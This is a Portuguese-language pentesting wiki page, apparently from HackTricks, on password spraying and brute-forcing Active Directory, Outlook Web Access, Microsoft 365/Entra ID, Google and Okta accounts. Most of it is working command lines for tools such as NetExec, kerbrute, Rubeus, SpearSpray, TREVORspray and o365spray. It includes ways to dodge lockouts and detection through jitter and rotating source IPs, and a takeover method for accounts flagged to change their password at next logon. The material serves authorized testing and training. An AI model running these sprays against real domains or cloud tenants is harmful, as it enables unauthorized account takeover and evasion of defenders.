# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Depois de encontrar vários **nomes de usuário válidos**, você pode tentar as **senhas mais comuns** (tenha em mente a política de senhas do ambiente) com cada um dos usuários descobertos.\
Por **padrão**, o **comprimento** **mínimo** da **senha** é **7**.

Listas de nomes de usuário comuns também podem ser úteis: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Observe que você **pode bloquear algumas contas se tentar várias senhas incorretas** (por padrão, mais de 10).

### Obter a política de senhas

Se você tiver credenciais de algum usuário ou um shell como usuário do domínio, poderá **obter a política de senhas com**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploração a partir do Linux (ou todos)

- Usando **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Usando **NetExec (CME successor)** para realizar password spraying direcionado e com pouco ruído em SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Usando [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(você pode indicar o número de tentativas para evitar bloqueios):**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Usando [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NÃO RECOMENDADO, ÀS VEZES NÃO FUNCIONA<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Com o módulo `scanner/smb/smb_login` do **Metasploit**:

![Password Spraying - Brute-Force: Com o módulo scanner/smb/smb login do Metasploit](<../../images/image (745).png>)

- Usando **rpcclient**:<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Do Windows

- Com o [Rubeus](https://github.com/Zer1t0/Rubeus) com o módulo brute:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Com [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Por padrão, ele pode gerar usuários do domínio e obter a política de senha do domínio, limitando as tentativas de acordo com ela):<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Com [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identificar e assumir o controle de contas "Password must change at next logon" (SAMR)

Uma técnica de baixo ruído consiste em fazer password spraying de uma senha benigna/vazia e identificar contas que retornam STATUS_PASSWORD_MUST_CHANGE, o que indica que a senha expirou forçadamente e pode ser alterada sem conhecer a senha antiga.<sup>[[9]](#references)[[10]](#references)</sup>

Workflow:
- Enumerar usuários (RID brute via SAMR) para criar a lista de alvos:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Faça Spray de uma senha vazia e continue após os acertos para capturar contas que precisam alterar a senha no próximo logon:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Para cada resultado, altere a senha via SAMR com o módulo do NetExec (não é necessária a senha antiga quando "must change" está definido):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Notas operacionais:
- Garanta que o relógio do seu host esteja sincronizado com o DC antes das operações baseadas em Kerberos: `sudo ntpdate <dc_fqdn>`.
- Um [+] sem (Pwn3d!) em alguns módulos (por exemplo, RDP/WinRM) significa que as creds são válidas, mas a conta não possui direitos de logon interativo.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Spraying de pre-autenticação Kerberos com direcionamento por LDAP e throttling com reconhecimento de PSO (SpearSpray)

O spraying baseado em pre-auth do Kerberos reduz o ruído em comparação com tentativas de SMB/NTLM/LDAP bind e se alinha melhor às políticas de bloqueio do AD. O SpearSpray combina direcionamento orientado por LDAP, um mecanismo de padrões e reconhecimento de políticas (política de domínio + PSOs + buffer de badPwdCount) para realizar o spraying com precisão e segurança. Ele também pode marcar principals comprometidos no Neo4j para pathing do BloodHound.<sup>[[1]](#references)</sup>

Ideias principais:
- Descoberta de usuários via LDAP com paginação e suporte a LDAPS, opcionalmente usando filtros LDAP personalizados.
- Filtragem com reconhecimento da política de bloqueio do domínio + PSOs para deixar um buffer de tentativas configurável (threshold) e evitar bloquear usuários.
- Validação de pre-auth do Kerberos usando bindings gssapi rápidos (gera 4768/4771 nos DCs em vez de 4625).
- Geração de senhas por usuário baseada em padrões, usando variáveis como nomes e valores temporais derivados do pwdLastSet de cada usuário.
- Controle de throughput com threads, jitter e máximo de requisições por segundo.
- Integração opcional com Neo4j para marcar usuários owned no BloodHound.

Uso básico e descoberta:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Direcionamento e controle de padrões:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Controles de furtividade e segurança:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Enriquecimento do Neo4j/BloodHound:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Visão geral do sistema de padrões (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Variáveis disponíveis incluem:
- {name}, {samaccountname}
- Temporal de cada usuário a partir de seu pwdLastSet (ou whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Helpers de composição e token da organização: {separator}, {suffix}, {extra}

Observações operacionais:

- Dê preferência a consultar o emulador PDC com -dc para ler o badPwdCount mais confiável e informações relacionadas à policy.
- Os resets de badPwdCount são acionados na próxima tentativa após a janela de observação; use o threshold e o timing para permanecer seguro.
- As tentativas de pre-auth do Kerberos aparecem como 4768/4771 na telemetria do DC; use jitter e rate-limiting para se misturar ao tráfego normal.

> Dica: o tamanho de página LDAP padrão do SpearSpray é 200; ajuste com -lps conforme necessário.

## Outlook Web Access

Existem várias ferramentas para **password spraying outlook**.

- Com [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- com [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Com [Ruler](https://github.com/sensepost/ruler) (confiável!)<sup>[[5]](#references)</sup>
- Com [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Com [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Para usar qualquer uma dessas ferramentas, você precisa de uma lista de usuários e de uma senha / uma pequena lista de senhas para spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Para cloud spraying, primeiro identifique se o tenant é **gerenciado**, **federado** ou **híbrido**, pois o endpoint e o comportamento de lockout podem ser diferentes do AD on-prem. No Microsoft Entra, o **Smart Lockout** altera a forma como tentativas repetidas consomem o orçamento de lockout:<sup>[[7]](#references)</sup>

- Repetir a **mesma senha incorreta** não continua incrementando o contador de lockout, mas tentar **novos candidatos** incrementa.
- Locais **familiares** e **não familiares** têm contadores **separados**.
- Tenants que usam **pass-through authentication (PTA)** não se beneficiam do rastreamento de hash de senhas incorretas; portanto, trate-os mais como alvos clássicos sensíveis a lockout.

Na prática, faça spray de **uma senha por rodada**, mantenha um espaçamento suficiente entre as rodadas e prefira ferramentas que possam descobrir o fluxo de autenticação real do tenant antes de enviar as tentativas.

- Com o [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORSpray), você pode fazer recon do tenant, descobrir o `token_endpoint`, fazer spray de `msol`/`adfs`/`owa`/`okta` e alternar o tráfego por vários IPs de saída:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Com o [**Spray365**](https://github.com/MarkoH17/Spray365), você pode criar previamente um **plano de execução** retomável, randomizar a ordem das autenticações e impor um **atraso mínimo por usuário** para permanecer fora da janela de bloqueio:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Com o [**o365spray**](https://github.com/0xZDH/o365spray), você pode validar o tenant, enumerar usuários com módulos como `onedrive` e realizar password spraying via `oauth2` ou `adfs`, mantendo **uma tentativa por usuário** durante cada janela de bloqueio. Se você já tiver uma API do FireProx, passe-a com `--proxy-url` para distribuir os IPs de origem:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
As técnicas recentes de operadores também passaram a adotar **distributed cloud spraying**. O [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) oferece suporte a janelas de tempo, embaralhamento de senhas, spraying em ADFS/M365 e exfiltração automática após a autenticação. Abusos recentes no mundo real também utilizaram a enumeração de contas pela **Microsoft Teams API** e a rotação de regiões da **AWS** para distribuir ondas de spraying entre múltiplas geografias de origem.<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Referências

- [1] [SpearSpray – Aprimore seu Password Spraying do Active Directory com inteligência sobre usuários](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Brute force de Kerberos com Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – Uma ferramenta de Password Spraying para credenciais do Active Directory](https://github.com/Greenwolf/Spray)
- [4] [Password Spraying do Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying no Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying e outras atividades divertidas com RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Atacantes lançam o TeamFiltration: campanha de tomada de controle de contas](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: de spray a gMSA e DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — LDAP anônimo → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
